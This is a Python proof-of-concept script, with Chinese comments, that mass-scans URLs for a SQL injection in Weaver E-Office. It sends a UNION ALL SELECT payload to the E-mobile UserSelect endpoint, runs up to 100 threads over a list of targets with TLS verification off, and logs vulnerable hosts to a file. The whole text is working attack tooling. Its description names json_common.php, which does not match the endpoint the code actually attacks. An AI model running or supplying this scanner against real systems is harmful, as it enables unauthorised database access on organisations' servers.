import argparse,sys,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    '''主函数'''
    banner()            
    parser = argparse.ArgumentParser(description = '泛微E-Office json_common.php SQL注入漏洞')    #实例化对象
    parser.add_argument('-u','--url',help='请输入你要判断的url')        #添加变量，参数
    parser.add_argument('-f','--file',help='请输入你要批量的url')       #添加变量，参数
    agres = parser.parse_args()                                     #实例化
    if agres.url and not agres.file:                        #判断url和文件
        poc(agres.url)                              #如果是url就调用poc
    elif agres.file and not agres.url:              #判断url和文件     
        url_list = []                             #定义列表
        with open (agres.file,'r',encoding='utf-8') as fp:  #以读的方式，utp-8编码打开文件
            for i in fp.readlines():                        
                url_list.append(i.strip().replace('\n',''))     #首尾去空
        mp = Pool(100)                      #定义线程数100
        mp.map(poc, url_list)               #定义线程数
        mp.close()                          #关闭
        mp.join()                            
    else: 
        print(f'usag:\n\t python3 {sys.argv[0]} -h')              #f 格式化输出 usag 用法 \t 制表符   sys.argv[0] 获取脚本文件名

def banner():
    '''横幅'''
    test = """                                                                                                                        


                                                                                                                                                   
                                                                                                                                                   
EEEEEEEEEEEEEEEEEEEEEE                      OOOOOOOOO        ffffffffffffffff    ffffffffffffffff    iiii                                          
E::::::::::::::::::::E                    OO:::::::::OO     f::::::::::::::::f  f::::::::::::::::f  i::::i                                         
E::::::::::::::::::::E                  OO:::::::::::::OO  f::::::::::::::::::ff::::::::::::::::::f  iiii                                          
EE::::::EEEEEEEEE::::E                 O:::::::OOO:::::::O f::::::fffffff:::::ff::::::fffffff:::::f                                                
  E:::::E       EEEEEE                 O::::::O   O::::::O f:::::f       fffffff:::::f       ffffffiiiiiii     cccccccccccccccc    eeeeeeeeeeee    
  E:::::E                              O:::::O     O:::::O f:::::f             f:::::f             i:::::i   cc:::::::::::::::c  ee::::::::::::ee  
  E::::::EEEEEEEEEE                    O:::::O     O:::::Of:::::::ffffff      f:::::::ffffff        i::::i  c:::::::::::::::::c e::::::eeeee:::::ee
  E:::::::::::::::E    --------------- O:::::O     O:::::Of::::::::::::f      f::::::::::::f        i::::i c:::::::cccccc:::::ce::::::e     e:::::e
  E:::::::::::::::E    -:::::::::::::- O:::::O     O:::::Of::::::::::::f      f::::::::::::f        i::::i c::::::c     ccccccce:::::::eeeee::::::e
  E::::::EEEEEEEEEE    --------------- O:::::O     O:::::Of:::::::ffffff      f:::::::ffffff        i::::i c:::::c             e:::::::::::::::::e 
  E:::::E                              O:::::O     O:::::O f:::::f             f:::::f              i::::i c:::::c             e::::::eeeeeeeeeee  
  E:::::E       EEEEEE                 O::::::O   O::::::O f:::::f             f:::::f              i::::i c::::::c     ccccccce:::::::e           
EE::::::EEEEEEEE:::::E                 O:::::::OOO:::::::Of:::::::f           f:::::::f            i::::::ic:::::::cccccc:::::ce::::::::e          
E::::::::::::::::::::E                  OO:::::::::::::OO f:::::::f           f:::::::f            i::::::i c:::::::::::::::::c e::::::::eeeeeeee  
E::::::::::::::::::::E                    OO:::::::::OO   f:::::::f           f:::::::f            i::::::i  cc:::::::::::::::c  ee:::::::::::::e  
EEEEEEEEEEEEEEEEEEEEEE                      OOOOOOOOO     fffffffff           fffffffff            iiiiiiii    cccccccccccccccc    eeeeeeeeeeeeee  
                                                                                                                                                   
                                                                                                                                                   
                                                                                                                                                   
                                                                                                                                                   
                                                                                                                                                   
                                                                                                                                                   
                                                                                                                                                   

                                                    
                                                                                                                                version: 1.0.0
                                                                                                                                author:sis2311@lsk

"""
    print(test)             #打印test


def poc(target):
    '''检测漏洞'''
    url = target + '/E-mobile/App/System/UserSelect/index.php?m=getUserLists&privId=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,(concat(database()))--'
    headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip'
    }
    try:
        result = requests.post(url=url,headers=headers,timeout=5,verify=False).text
        if 'eoffice' in result:
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+] 存在漏洞 {target} '+'\n')
        else:
            print(f'[-]{target} is not vulabe')
    except:
        print(f'[*]{target} server error')

'''检测漏洞脚本'''
if __name__ == '__main__':
    '''定义主函数'''
    main()